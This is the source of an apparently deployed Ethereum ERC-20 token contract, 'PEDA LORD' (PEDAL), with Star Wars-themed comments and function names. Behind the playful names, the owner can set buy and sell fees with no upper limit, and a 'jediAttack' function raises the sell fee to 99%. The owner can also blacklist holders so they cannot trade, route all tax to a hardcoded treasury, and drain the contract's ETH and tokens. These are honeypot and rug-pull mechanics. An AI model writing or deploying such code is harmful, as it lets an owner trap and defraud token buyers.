/**
 *Submitted for verification at Etherscan.io on 2023-09-10
*/

/* 

Once you start down the dork path, forever will it dominate your destiny.
The first finding the path, greatly rewarded they will be.
But ready you must be, along the way many fears there will be.

p#######.##p

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract PEDALORD is Context, IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private blacklist;
    address payable private jedi_treasury;
    uint256 firstBlock;

    string private constant _name = "PEDA LORD";
    string private constant _symbol = "PEDAL";
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1_000_000_000 * 10**_decimals;
    uint256 public _TaxThreshold;

    uint256 private _BuyFee = 30;
    uint256 private _SellFee = 60;
    uint256 private _preventSwapBefore = 40;
    uint256 public _maxTxAmount = 5_000_000 * 10**_decimals;
    uint256 public _maxWalletSize = _totalSupply / 150;
    uint256 private _buyCount = 0;
    uint256 private _JediAttackCount = 0;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    
    event JediAttackToggled(bool enabled);
    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    event Wisdom(address indexed sender, string message);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        jedi_treasury = payable(0xb904348b65E23A23Fb0B04009E7886D6f78b9066);

        _balances[_msgSender()] = _totalSupply;
        
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[jedi_treasury] = true;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function setJediTreasury(address payable _jediTreasury) external onlyOwner {
        require(_jediTreasury != address(0), "Address must be valid");
        jedi_treasury = _jediTreasury;
    }

    function clearETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function clearToken(IERC20 token) external onlyOwner {
        uint256 balance = token.balanceOf(address(this));
        token.transfer(owner(), balance);
    }

    function updateBuyFee(uint256 value) external onlyOwner {
        _BuyFee = value;
    }

    function updateSellFee(uint256 value) external onlyOwner {
        _SellFee = value;
    }

    function jediAttack() external onlyOwner {
        require(_JediAttackCount < 1, "JediAttack to kill Siths");

        _SellFee = 99;
        _JediAttackCount++;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        uint256 taxAmount = 0;

        if (from != owner() && to != owner() && from != address(this) && !_isExcludedFromFee[from]) {
            require(!blacklist[from] && !blacklist[to]);
            
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
                taxAmount = (amount * _BuyFee) / 100;
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");

                if (firstBlock + 3 > block.number) {
                    require(!isContract(to));
                }
                _buyCount++;
            }

            if (to != uniswapV2Pair && !_isExcludedFromFee[to]) {
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = (amount * _SellFee) / 100;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance >= _TaxThreshold && _buyCount > _preventSwapBefore) {
                swapTokensForEth(_TaxThreshold);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] += taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] -= amount;
        _balances[to] += amount - taxAmount;
        emit Transfer(from, to, amount - taxAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    
        uint256 contractETHBalance = address(this).balance;
        uint256 jediAmount = contractETHBalance;

        jedi_treasury.transfer(jediAmount);
    }

    function setTaxThreshold(uint256 newThreshold) external onlyOwner {
        _TaxThreshold = newThreshold;
    }

    function feelTheForce() external onlyOwner {
        _maxTxAmount = _totalSupply;
        _maxWalletSize = _totalSupply;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    function death(uint256 amount) public onlyOwner {
        require(amount <= _balances[msg.sender], "Amount exceeds available balance");

        _transfer(msg.sender, 0x000000000000000000000000000000000000dEaD, amount);
    }

    function addDead(address[] memory addresses) public onlyOwner {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = true;
        }
    }

    function delDead(address[] memory addresses) public onlyOwner {
        for (uint i = 0; i < addresses.length; i++) {
            blacklist[addresses[i]] = false;
        }
    }

    function isDead(address a) public view returns (bool) {
        return blacklist[a];
    }

    function forceIsCalling() external onlyOwner {
        emit Wisdom(msg.sender, "May the Force be with you.");
    }

    function fearYouFeel() external onlyOwner {
        emit Wisdom(msg.sender, "Pass on what you have learned.");
    }

    function failureYouLearn() external onlyOwner {
        emit Wisdom(msg.sender, "The greatest teacher failure is.");
    }

    function candleOrNight() external onlyOwner {
        emit Wisdom(msg.sender, "Give off light, or darkness, Padawan. Be a candle, or the night.");
    }

    function hopYouHave() external onlyOwner {
        emit Wisdom(msg.sender, "Your path you must decide.");
    }

    function doOrDoNot() external onlyOwner {
        require(!swapEnabled, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        _TaxThreshold = (_totalSupply * 2) / 1000;
        swapEnabled = true;
        firstBlock = block.number;
    }

    receive() external payable {}
}